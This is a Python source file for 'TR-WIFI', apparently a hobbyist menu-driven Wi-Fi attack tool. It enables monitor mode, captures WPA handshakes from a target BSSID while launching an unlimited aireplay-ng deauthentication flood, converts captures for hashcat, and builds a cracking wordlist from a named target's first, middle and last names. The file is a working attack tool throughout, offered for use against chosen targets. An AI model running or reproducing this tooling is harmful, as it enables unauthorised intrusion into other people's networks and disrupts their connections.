import os
import sys
import subprocess
import pyfiglet
import random, string
from colorama import Fore

def banner():
    text = pyfiglet.figlet_format("TR-WIFI")
    print(f"{Fore.CYAN}{text}")
    print(Fore.YELLOW + "Developed by - TRFAHIM" + Fore.RESET)

def home_menu():
    print(f"\n{Fore.LIGHTBLUE_EX}[1] {Fore.WHITE}Monitor Mode")
    print(f"{Fore.LIGHTMAGENTA_EX}[2] {Fore.WHITE}Scan Available Wifi")
    print(f"{Fore.LIGHTYELLOW_EX}[3] {Fore.WHITE}Start Attack")
    print(f"{Fore.GREEN}[4] {Fore.WHITE}Convert Cap File")
    print(f"{Fore.LIGHTBLUE_EX}[5] {Fore.WHITE}Password Genator")
    print(f"{Fore.RED}[0] {Fore.WHITE}Exit")

def cl():
    os.system("clear" if os.name == "posix" else "cls")

def back_home():
    b_hm = input(f"\n{Fore.GREEN}[H] Back Home {Fore.RED}[E] Exit >> {Fore.WHITE}").upper()
    if b_hm == "E":
        sys.exit(0)
    else:
        main()

def check_root():
    return os.geteuid() == 0

def monitor_mode():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "wlan0mon" in result.stdout:
            print(Fore.GREEN + "[+] Monitor mode is already enabled on wlan0mon." + Fore.RESET)
            return

        os.system("ifconfig wlan0 down")
        os.system("iwconfig wlan0 mode monitor")
        os.system("ifconfig wlan0 up")

        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            print(Fore.GREEN + "\n[+] Monitor mode enabled successfully on wlan0." + Fore.RESET)
            print(f"{Fore.BLUE}[+] Your Wifi Interface {Fore.YELLOW}'wlan0'\n")
        else:
            print(Fore.RED + "\n[-] Monitor mode is not enabled. Please check your wireless card compatibility or try manually." + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)

def wifi_scan(interface):
    os.system(f"airodump-ng {interface}")       

def start_airodump(interface, bssid, channel, filename):
    file_save = f"/root/Desktop/{filename}"
    os.system('echo -ne "Devloped by- TR FAHIM"')
    command = f"gnome-terminal -- bash -c 'airodump-ng --channel {channel} --bssid {bssid} --write {file_save} {interface}'"
    subprocess.run(command, shell=True)

def start_aireplay(interface, bssid):
    command = f"gnome-terminal -- bash -c 'aireplay-ng --deauth 0 -a {bssid} {interface}'"
    subprocess.run(command, shell=True)

def convert_cap_to_22000(cap_file, output_file):
    try:
        check_tool = subprocess.run(["which", "hcxpcapngtool"], capture_output=True, text=True)
        if not check_tool.stdout.strip():
            print(Fore.RED + "[-] hcxpcapngtool is not installed. Install it using: sudo apt install hcxtools" + Fore.RESET)
            return
        
        command = f"hcxpcapngtool -o {output_file} {cap_file}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print(Fore.GREEN + f"[+] Conversion successful! Output file: {output_file}" + Fore.RESET)
        else:
            print(Fore.RED + f"[-] Conversion failed. Error:\n{result.stderr}" + Fore.RESET)

    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Fore.RESET)

def pass_generator(first_nm,middle_nm,last_nm):
    
    passwords = []
    
    first_1 = first_nm[:1]
    last_1 = last_nm[:1]
    first_2 = first_nm[:2]
    last_2 = last_nm[:2]
    
    for zero in range(8,21):
        passwords.append("0"*zero)
    
    for num in range(1000001):
        digit = int(num)
        
        ## Special Case
        passwords.append("@"*8)
        passwords.append("@"*9)
        passwords.append("@"*10)
        passwords.append("@"*11)
        passwords.append("."*8)
        passwords.append("."*9)
        passwords.append("."*10)
        passwords.append("."*11)
        passwords.append("!@#$%^&*")
        passwords.append("#"*8)
        passwords.append("#"*9)
        passwords.append("#"*10)
        passwords.append("#"*11)
        passwords.append("*"*8)
        passwords.append("*"*9)
        passwords.append("*"*10)
        passwords.append("*"*11)
        passwords.append(f"Password{digit}")
        passwords.append("Password")
        passwords.append("PASSWORD")
        passwords.append("password")
        passwords.append(f"password{digit}")
        passwords.append(f"PASSWORD{digit}")
    
        for sm_num in range(8, 20):
            passwords.append("1"*sm_num)
            passwords.append("2"*sm_num)
            passwords.append("3"*sm_num)
            passwords.append("4"*sm_num)
            passwords.append("5"*sm_num)
            passwords.append("6"*sm_num)
            passwords.append("7"*sm_num)
            passwords.append("8"*sm_num)
            passwords.append("9"*sm_num)
        
        ## New Method
        passwords.append(f"{first_1}{last_1}{digit}")
        passwords.append(f"{first_1.upper()}{last_1.upper()}{digit}")
        passwords.append(f"{first_1.lower()}{last_1.lower()}{digit}")
        passwords.append(f"{first_1}{last_1}@{digit}")
        passwords.append(f"{first_1}{last_1}#{digit}")
        passwords.append(f"{digit}{first_1}{last_1}")
        
        passwords.append(f"{digit}{first_nm[:2].title()}")
        passwords.append(f"{digit}@{first_nm[:2].title()}")
        passwords.append(f"{digit}#{first_nm[:2].title()}")
        passwords.append(f"{digit}{first_nm[:2].upper()}")
        passwords.append(f"{digit}{first_nm[:2].lower()}")
        passwords.append(f"{digit}@{first_nm[:2].upper()}")
        passwords.append(f"{digit}@{first_nm[:2].lower()}")
        passwords.append(f"{first_nm[:2].title()}{digit}")
        passwords.append(f"{first_nm[:2].title()}@{digit}")
        passwords.append(f"{first_nm[:2].title()}#{digit}")
        passwords.append(f"{first_nm[:2].upper()}{digit}")
        passwords.append(f"{first_nm[:2].lower()}{digit}")
        passwords.append(f"{first_nm[:2].upper()}@{digit}")
        passwords.append(f"{first_nm[:2].lower()}#{digit}")
        
        passwords.append(f"{digit}{first_nm[:3].title()}")
        passwords.append(f"{digit}@{first_nm[:3].title()}")
        passwords.append(f"{digit}#{first_nm[:3].title()}")
        passwords.append(f"{digit}{first_nm[:3].upper()}")
        passwords.append(f"{digit}{first_nm[:3].lower()}")
        passwords.append(f"{digit}@{first_nm[:3].upper()}")
        passwords.append(f"{digit}@{first_nm[:3].lower()}")  
        passwords.append(f"{first_nm[:3].title()}{digit}")
        passwords.append(f"{first_nm[:3].title()}@{digit}")
        passwords.append(f"{first_nm[:3].title()}#{digit}")
        passwords.append(f"{first_nm[:3].upper()}{digit}")
        passwords.append(f"{first_nm[:3].lower()}{digit}")
        passwords.append(f"{first_nm[:3].upper()}@{digit}")
        passwords.append(f"{first_nm[:3].lower()}#{digit}")
        
        passwords.append(f"{first_nm[-3:].title()}{digit}")
        passwords.append(f"{first_nm[-3:].title()}@{digit}")
        passwords.append(f"{first_nm[-3:].title()}#{digit}")
        passwords.append(f"{first_nm[-3:].upper()}{digit}")
        passwords.append(f"{first_nm[-3:].lower()}{digit}")
        passwords.append(f"{first_nm[-3:].upper()}@{digit}")
        passwords.append(f"{first_nm[-3:].lower()}#{digit}")
        passwords.append(f"{digit}{first_nm[-3:].title()}")
        passwords.append(f"{digit}@{first_nm[-3:].title()}")
        passwords.append(f"{digit}#{first_nm[-3:].title()}")
        passwords.append(f"{digit}{first_nm[-3:].upper()}")
        passwords.append(f"{digit}{first_nm[-3:].lower()}")
        passwords.append(f"{digit}@{first_nm[-3:].upper()}")
        passwords.append(f"{digit}@{first_nm[-3:].lower()}")  
        
        passwords.append(f"{first_2.title()}{digit}")
        passwords.append(f"{first_2.upper()}{digit}")
        passwords.append(f"{first_2.lower()}{digit}")
        passwords.append(f"{first_2}@{digit}")
        passwords.append(f"{first_2}#{digit}")
        passwords.append(f"{first_2}{last_2}")
        ## First Name
        passwords.append(f"{first_nm}{digit}")
        passwords.append(f"{first_nm.upper()}{digit}")
        passwords.append(f"{first_nm.lower()}{digit}")
        passwords.append(f"{digit}{first_nm}")
        passwords.append(f"{digit}{first_nm.upper()}")
        passwords.append(f"{digit}{first_nm.lower()}")
        passwords.append(f"{digit}@{first_nm}")
        passwords.append(f"{digit}#{first_nm}")
        passwords.append(f"{digit}&{first_nm}")
        passwords.append(f"{digit}@{first_nm.upper()}")
        passwords.append(f"{digit}#{first_nm.upper()}")
        passwords.append(f"{digit}&{first_nm.upper()}")
        passwords.append(f"{digit}@{first_nm.lower()}")
        passwords.append(f"{digit}#{first_nm.lower()}")
        passwords.append(f"{digit}&{first_nm.lower()}")
        passwords.append(f"{first_nm}@{digit}")
        passwords.append(f"{first_nm}#{digit}")
        passwords.append(f"{first_nm}&{digit}")
        passwords.append(f"{first_nm.upper()}@{digit}")
        passwords.append(f"{first_nm.upper()}#{digit}")
        passwords.append(f"{first_nm.upper()}&{digit}")
        passwords.append(f"{first_nm.lower()}@{digit}")
        passwords.append(f"{first_nm.lower()}#{digit}")
        passwords.append(f"{first_nm.lower()}&{digit}")
        passwords.append(f"{first_nm}_{digit}")
        passwords.append(f"{first_nm.upper()}_{digit}")
        passwords.append(f"{first_nm.lower()}_{digit}")
        passwords.append(f"{digit}_{first_nm}")
        passwords.append(f"{digit}_{first_nm.upper()}")
        passwords.append(f"{digit}_{first_nm.lower()}")
            
        if last_nm:
            ## New 
            passwords.append(f"{digit}{last_nm[:2].title()}")
            passwords.append(f"{digit}@{last_nm[:2].title()}")
            passwords.append(f"{digit}#{last_nm[:2].title()}")
            passwords.append(f"{digit}{last_nm[:2].upper()}")
            passwords.append(f"{digit}{last_nm[:2].lower()}")
            passwords.append(f"{digit}@{last_nm[:2].upper()}")
            passwords.append(f"{digit}@{last_nm[:2].lower()}")
            passwords.append(f"{last_nm[:2].title()}{digit}")
            passwords.append(f"{last_nm[:2].title()}@{digit}")
            passwords.append(f"{last_nm[:2].title()}#{digit}")
            passwords.append(f"{last_nm[:2].upper()}{digit}")
            passwords.append(f"{last_nm[:2].lower()}{digit}")
            passwords.append(f"{last_nm[:2].upper()}@{digit}")
            passwords.append(f"{last_nm[:2].lower()}#{digit}")
            
            passwords.append(f"{digit}{last_nm[:3].title()}")
            passwords.append(f"{digit}@{last_nm[:3].title()}")
            passwords.append(f"{digit}#{last_nm[:3].title()}")
            passwords.append(f"{digit}{last_nm[:3].upper()}")
            passwords.append(f"{digit}{last_nm[:3].lower()}")
            passwords.append(f"{digit}@{last_nm[:3].upper()}")
            passwords.append(f"{digit}@{last_nm[:3].lower()}")
            
            passwords.append(f"{last_nm[:3].title()}{digit}")
            passwords.append(f"{last_nm[:3].title()}@{digit}")
            passwords.append(f"{last_nm[:3].title()}#{digit}")
            passwords.append(f"{last_nm[:3].upper()}{digit}")
            passwords.append(f"{last_nm[:3].lower()}{digit}")
            passwords.append(f"{last_nm[:3].upper()}@{digit}")
            passwords.append(f"{last_nm[:3].lower()}#{digit}")
            
            passwords.append(f"{last_nm[-3:].title()}{digit}")
            passwords.append(f"{last_nm[-3:].title()}@{digit}")
            passwords.append(f"{last_nm[-3:].title()}#{digit}")
            passwords.append(f"{last_nm[-3:].upper()}{digit}")
            passwords.append(f"{last_nm[-3:].lower()}{digit}")
            passwords.append(f"{last_nm[-3:].upper()}@{digit}")
            passwords.append(f"{last_nm[-3:].lower()}#{digit}")
            
            passwords.append(f"{digit}{last_nm[-3:].title()}")
            passwords.append(f"{digit}@{last_nm[-3:].title()}")
            passwords.append(f"{digit}#{last_nm[-3:].title()}")
            passwords.append(f"{digit}{last_nm[-3:].upper()}")
            passwords.append(f"{digit}{last_nm[-3:].lower()}")
            passwords.append(f"{digit}@{last_nm[-3:].upper()}")
            passwords.append(f"{digit}@{last_nm[-3:].lower()}") 
 
            ## Last Name 
            passwords.append(f"{last_nm}{digit}")
            passwords.append(f"{last_nm.upper()}{digit}")
            passwords.append(f"{last_nm.lower()}{digit}")
            passwords.append(f"{digit}{last_nm}")
            passwords.append(f"{digit}{last_nm.upper()}")
            passwords.append(f"{digit}{last_nm.lower()}")
            passwords.append(f"{digit}@{last_nm}")
            passwords.append(f"{digit}#{last_nm}")
            passwords.append(f"{digit}&{last_nm}")
            passwords.append(f"{digit}@{last_nm.upper()}")
            passwords.append(f"{digit}#{last_nm.upper()}")
            passwords.append(f"{digit}&{last_nm.upper()}")
            passwords.append(f"{digit}@{last_nm.lower()}")
            passwords.append(f"{digit}#{last_nm.lower()}")
            passwords.append(f"{digit}&{last_nm.lower()}")
            passwords.append(f"{last_nm}@{digit}")
            passwords.append(f"{last_nm}#{digit}")
            passwords.append(f"{last_nm}&{digit}")
            passwords.append(f"{last_nm.upper()}@{digit}")
            passwords.append(f"{last_nm.upper()}#{digit}")
            passwords.append(f"{last_nm.upper()}&{digit}")
            passwords.append(f"{last_nm.lower()}@{digit}")
            passwords.append(f"{last_nm.lower()}#{digit}")
            passwords.append(f"{last_nm.lower()}&{digit}")
            
            passwords.append(f"{first_nm}{last_nm}")
            passwords.append(f"{first_nm}{last_nm}{digit}")
            passwords.append(f"{digit}{last_nm}{first_nm}")
            passwords.append(f"{first_nm.upper()}{last_nm.upper()}")
            passwords.append(f"{first_nm.lower()}{last_nm.lower()}")
            passwords.append(f"{first_nm.upper()}{last_nm.lower()}")
            passwords.append(f"{first_nm.lower()}{last_nm.upper()}")
            passwords.append(f"{first_nm.upper()}{last_nm.lower()}{digit}")
            passwords.append(f"{first_nm.lower()}{last_nm.upper()}{digit}")
            passwords.append(f"{first_nm.upper()}{digit}{last_nm.lower()}")
            passwords.append(f"{first_nm.lower()}{digit}{last_nm.upper()}")
            
            passwords.append(f"{first_nm}@{last_nm}")
            passwords.append(f"{first_nm}{last_nm}@{digit}")
            passwords.append(f"{first_nm.upper()}@{last_nm.upper()}")
            passwords.append(f"{first_nm.lower()}@{last_nm.lower()}")
            passwords.append(f"{first_nm}#{last_nm}")
            passwords.append(f"{first_nm.upper()}#{last_nm.upper()}")
            passwords.append(f"{first_nm.lower()}#{last_nm.lower()}")
            passwords.append(f"{first_nm}&{last_nm}")
            passwords.append(f"{first_nm}{last_nm}&{digit}")
            passwords.append(f"{first_nm.upper()}&{last_nm.upper()}")
            passwords.append(f"{first_nm.lower()}&{last_nm.lower()}")
            
            passwords.append(f"{last_nm}{first_nm}")
            passwords.append(f"{last_nm.upper()}{first_nm.upper()}")
            passwords.append(f"{last_nm.lower()}{first_nm.lower()}")
            passwords.append(f"{first_nm}_{last_nm}")
            passwords.append(f"{first_nm.upper()}_{last_nm.upper()}")
            passwords.append(f"{first_nm.lower()}_{last_nm.lower()}")
            passwords.append(f"{first_nm}_{last_nm}{digit}")
            passwords.append(f"{first_nm.upper()}_{last_nm.upper()}{digit}")
            passwords.append(f"{first_nm.lower()}_{last_nm.lower()}{digit}")
        
        if middle_nm:
            if len(middle_nm) == 3:
                passwords.append(f"{middle_nm}{digit:05d}") 
                passwords.append(f"{middle_nm.upper()}{digit:05d}") 
                passwords.append(f"{middle_nm.lower()}{digit:05d}") 
            elif len(middle_nm) == 4:
                passwords.append(f"{middle_nm}{digit:04d}")
                passwords.append(f"{middle_nm.upper()}{digit:04d}")
                passwords.append(f"{middle_nm.lower()}{digit:04d}")
            elif len(middle_nm) == 5:
                passwords.append(f"{middle_nm}{digit:03d}")
                passwords.append(f"{middle_nm.upper()}{digit:03d}")
                passwords.append(f"{middle_nm.lower()}{digit:03d}")
            elif len(middle_nm) == 6:
                passwords.append(f"{middle_nm}{digit:02d}")
                passwords.append(f"{middle_nm.upper()}{digit:02d}")
                passwords.append(f"{middle_nm.lower()}{digit:02d}")
            else:
                passwords.append(f"{middle_nm}{digit}")
                passwords.append(f"{middle_nm.upper()}{digit}")  
                passwords.append(f"{middle_nm.lower()}{digit}")    
         
        passwords.append(digit)                
        passwords.append(f"{digit:08d}")    
        passwords.append(f"{digit:09d}")
        passwords.append(f"{digit:010d}") 
        passwords.append(f"{digit:05d}{digit:06d}")
        passwords.append(f"{digit:06d}{digit:06d}") 
        passwords.append(f"{digit:06d}{digit:07d}")    
         
    return passwords
            
def save_file(passwords, file_name="wifi_passlist.txt"):
    with open(file_name, "w") as file:
        for password in passwords:
            file.write(f"{password}\n")

    print(f"\nPasslist save as {file_name}\n")


def main():
    cl()
    banner()

    if not check_root():
        print(Fore.RED + "\n[!] This script must be run as root (use sudo)" + Fore.RESET)
        sys.exit(1)

    home_menu()
    home_input = input(Fore.CYAN + "\n>>>> " + Fore.WHITE)

    if home_input == "1":
        cl()
        banner()
        monitor_mode()
        back_home()

    elif home_input == "2":
        cl()
        banner()
        interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0] >>> " + Fore.WHITE)
        print(Fore.RED + "\nSTOP THIS PROCESS (CTRL+C)" + Fore.RESET)
        wifi_scan(interface)
        back_home()

    elif home_input == "3":
        cl()
        banner()
        bssid = input(Fore.LIGHTMAGENTA_EX + "\nEnter Target Wifi BSSID >> " + Fore.WHITE)
        interface = input(Fore.LIGHTBLUE_EX + "Enter Interface Name [wlan0] >> " + Fore.WHITE)
        channel = input(Fore.YELLOW + "Enter Channel >> " + Fore.WHITE)
        filename = input(Fore.GREEN + "Enter File Name (without extension) >> " + Fore.WHITE)

        input(Fore.RED + "\nPress Enter when enough packets are captured to start cracking..." + Fore.RESET)
        start_airodump(interface, bssid, channel, filename)
        start_aireplay(interface, bssid)
        back_home()

    elif home_input == "4":
        cl()
        banner()
        cap_file = input(Fore.LIGHTBLUE_EX + "\nEnter the path to your .cap file: " + Fore.WHITE)
        output_file = input(Fore.LIGHTYELLOW_EX + "Enter the output .22000 file path: " + Fore.WHITE)
        
        convert_cap_to_22000(cap_file, output_file)
        back_home()
        
    elif home_input == "5":
        cl()
        banner()
        first_nm = input("\nEnter Target First Name >> ").title()
        middle_nm = input("Enter Target Middle Name (if none then skip) >> ").title()
        last_nm = input("Enter Target Last Name >> ").title()
        print("\nIt tooks take time depend on your device capability\nWait Sometimes.......\n")
        random_case = (random.choice(string.ascii_uppercase)+random.choice(string.ascii_uppercase))
        file_name = (f"Wifi_attack_{first_nm}_{random_case}.txt")
        
        password_list = pass_generator(first_nm,middle_nm,last_nm)

        save_file(password_list, file_name)
        
              

if __name__ == "__main__":
    main()
